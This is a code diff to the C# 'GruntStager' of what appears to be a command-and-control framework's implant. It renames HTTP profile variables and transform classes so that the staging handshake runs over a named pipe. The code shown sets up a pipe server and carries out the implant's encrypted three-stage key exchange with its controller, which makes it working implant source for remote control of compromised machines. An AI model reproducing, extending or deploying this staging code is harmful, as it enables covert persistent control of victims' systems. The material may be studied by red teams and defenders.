@@ -31,8 +31,8 @@ namespace GruntStager
         {
             try
             {
-                string ProfileHttpPostRequest = @"{{REPLACE_PROFILE_HTTP_POST_REQUEST}}".Replace(Environment.NewLine, "\n");
-                string ProfileHttpPostResponse = @"{{REPLACE_PROFILE_HTTP_POST_RESPONSE}}".Replace(Environment.NewLine, "\n");
+                string ProfileWriteFormat = @"{{REPLACE_PROFILE_WRITE_FORMAT}}".Replace(Environment.NewLine, "\n");
+                string ProfileReadFormat = @"{{REPLACE_PROFILE_READ_FORMAT}}".Replace(Environment.NewLine, "\n");
                 string PipeName = @"{{REPLACE_PIPE_NAME}}";
 
                 string aGUID = @"{{REPLACE_GRUNT_GUID}}";
@@ -53,7 +53,7 @@ namespace GruntStager
                 byte[] hash = hmac.ComputeHash(EncryptedRSAPublicKey);
                 string Stage0Body = String.Format(MessageFormat, aGUID + GUID, "0", "", Convert.ToBase64String(SetupAESKey.IV), Convert.ToBase64String(EncryptedRSAPublicKey), Convert.ToBase64String(hash));
 
-                string transformedResponse = HttpMessageTransform.Transform(Encoding.UTF8.GetBytes(Stage0Body));
+                string transformedResponse = MessageTransform.Transform(Encoding.UTF8.GetBytes(Stage0Body));
                 NamedPipeServerStream pipe = null;
                 string Stage0Response = "";
                 PipeSecurity ps = new PipeSecurity();
@@ -61,11 +61,11 @@ namespace GruntStager
                 pipe = new NamedPipeServerStream(PipeName, PipeDirection.InOut, NamedPipeServerStream.MaxAllowedServerInstances, PipeTransmissionMode.Byte, PipeOptions.Asynchronous, 1024, 1024, ps);
                 pipe.WaitForConnection();
                 System.Threading.Thread.Sleep(5000);
-                var Stage0Bytes = Encoding.UTF8.GetBytes(String.Format(ProfileHttpPostRequest, transformedResponse));
+                var Stage0Bytes = Encoding.UTF8.GetBytes(String.Format(ProfileWriteFormat, transformedResponse, GUID));
                 Write(pipe, Stage0Bytes);
                 Stage0Response = Encoding.UTF8.GetString(Read(pipe)).Replace("\"", "");
-                string extracted = Parse(Stage0Response, ProfileHttpPostResponse)[0];
-                extracted = Encoding.UTF8.GetString(HttpMessageTransform.Invert(extracted));
+                string extracted = Parse(Stage0Response, ProfileReadFormat)[0];
+                extracted = Encoding.UTF8.GetString(MessageTransform.Invert(extracted));
                 List<string> parsed = Parse(extracted, MessageFormat);
                 string iv64str = parsed[3];
                 string message64str = parsed[4];
@@ -89,14 +89,14 @@ namespace GruntStager
                 hash = hmac.ComputeHash(EncryptedChallenge1);
 
                 string Stage1Body = String.Format(MessageFormat, GUID, "1", "", Convert.ToBase64String(SessionKey.IV), Convert.ToBase64String(EncryptedChallenge1), Convert.ToBase64String(hash));
-                transformedResponse = HttpMessageTransform.Transform(Encoding.UTF8.GetBytes(Stage1Body));
+                transformedResponse = MessageTransform.Transform(Encoding.UTF8.GetBytes(Stage1Body));
 
                 string Stage1Response = "";
-                var Stage1Bytes = Encoding.UTF8.GetBytes(String.Format(ProfileHttpPostRequest, transformedResponse));
+                var Stage1Bytes = Encoding.UTF8.GetBytes(String.Format(ProfileWriteFormat, transformedResponse, GUID));
                 Write(pipe, Stage1Bytes);
                 Stage1Response = Encoding.UTF8.GetString(Read(pipe)).Replace("\"", "");
-                extracted = Parse(Stage1Response, ProfileHttpPostResponse)[0];
-                extracted = Encoding.UTF8.GetString(HttpMessageTransform.Invert(extracted));
+                extracted = Parse(Stage1Response, ProfileReadFormat)[0];
+                extracted = Encoding.UTF8.GetString(MessageTransform.Invert(extracted));
                 parsed = Parse(extracted, MessageFormat);
                 iv64str = parsed[3];
                 message64str = parsed[4];
@@ -117,14 +117,14 @@ namespace GruntStager
                 hash = hmac.ComputeHash(EncryptedChallenge2);
 
                 string Stage2Body = String.Format(MessageFormat, GUID, "2", "", Convert.ToBase64String(SessionKey.IV), Convert.ToBase64String(EncryptedChallenge2), Convert.ToBase64String(hash));
-                transformedResponse = HttpMessageTransform.Transform(Encoding.UTF8.GetBytes(Stage2Body));
+                transformedResponse = MessageTransform.Transform(Encoding.UTF8.GetBytes(Stage2Body));
 
                 string Stage2Response = "";
-                var Stage2Bytes = Encoding.UTF8.GetBytes(String.Format(ProfileHttpPostRequest, transformedResponse));
+                var Stage2Bytes = Encoding.UTF8.GetBytes(String.Format(ProfileWriteFormat, transformedResponse, GUID));
                 Write(pipe, Stage2Bytes);
                 Stage2Response = Encoding.UTF8.GetString(Read(pipe)).Replace("\"", "");
-                extracted = Parse(Stage2Response, ProfileHttpPostResponse)[0];
-                extracted = Encoding.UTF8.GetString(HttpMessageTransform.Invert(extracted));
+                extracted = Parse(Stage2Response, ProfileReadFormat)[0];
+                extracted = Encoding.UTF8.GetString(MessageTransform.Invert(extracted));
                 parsed = Parse(extracted, MessageFormat);
                 iv64str = parsed[3];
                 message64str = parsed[4];
